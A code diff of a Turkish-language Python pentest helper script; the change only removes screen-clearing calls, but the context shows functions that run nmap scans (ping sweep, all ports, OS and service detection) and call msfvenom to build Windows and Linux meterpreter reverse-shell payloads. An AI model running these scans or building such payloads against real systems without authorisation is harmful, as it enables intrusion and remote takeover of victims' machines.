@@ -6,7 +6,6 @@ import os
 
 
 def ping_at(ip):
-    ekran_temizle()
     # İşletim sistemine göre ping parametresi
     if platform.system().lower() == "windows":
         param = "-n"
@@ -27,7 +26,6 @@ def ping_at(ip):
         print("❌ Ping başarısız!")
 
 def ag_tara(network):
-    ekran_temizle()
     result = subprocess.run(
         ["nmap", "-sn", network],
         stdout=subprocess.PIPE,
@@ -37,7 +35,6 @@ def ag_tara(network):
     print(result.stdout)
 
 def port_tara(ip):
-    ekran_temizle()
     result = subprocess.run(
         ["nmap", "-p-", ip],
         stdout=subprocess.PIPE,
@@ -47,7 +44,6 @@ def port_tara(ip):
     print(result.stdout)
 
 def os_tara(ip):
-    ekran_temizle()
     result = subprocess.run(
         ["nmap", "-O", ip],
         stdout=subprocess.PIPE,
@@ -57,7 +53,6 @@ def os_tara(ip):
     print(result.stdout)
 
 def sv_tara(ip):
-    ekran_temizle()
     result = subprocess.run(
         ["nmap", "-sV", ip],
         stdout=subprocess.PIPE,
@@ -67,7 +62,6 @@ def sv_tara(ip):
     print(result.stdout)
 
 def payloadWin(Lip, dosya):
-    ekran_temizle()
     result = subprocess.run(
         ["msfvenom", "-p", "windows/meterpreter/reverse_tcp","LHOST="+Lip, "LPORT=4444", "-f","exe","-o", dosya],
         stdout=subprocess.PIPE,
@@ -77,7 +71,6 @@ def payloadWin(Lip, dosya):
     print(result.stdout)
 
 def payloadLin(Lip, dosya):
-    ekran_temizle()
     result = subprocess.run(
         ["msfvenom", "-p", "payload/linux/x64/meterpreter/reverse_tcp","LHOST="+Lip, "LPORT=4444", "-f","elf","-o", dosya],
         stdout=subprocess.PIPE,
